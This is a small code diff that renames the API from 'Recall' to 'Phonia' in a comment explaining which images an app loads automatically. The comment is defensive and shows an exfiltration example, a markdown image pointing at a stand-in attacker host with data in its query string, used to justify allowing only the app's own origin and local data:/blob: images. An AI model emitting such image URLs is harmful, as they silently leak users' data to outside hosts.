@@ -6,7 +6,7 @@
  * location into an image URL: `![](https://attacker/p.png?d=…)`. The query,
  * path or host carries the data, so loading such an image is a zero-click
  * leak, not just IP/UA exposure. Only these load by themselves:
- *  - the Recall API's own origin, the one the app already talks to (every
+ *  - the Phonia API's own origin, the one the app already talks to (every
  *    picture the server adds is an attachment there: photo lookups, answer
  *    photos, the user's uploads);
  *  - inline raster `data:` images and local `blob:` URIs (no network).
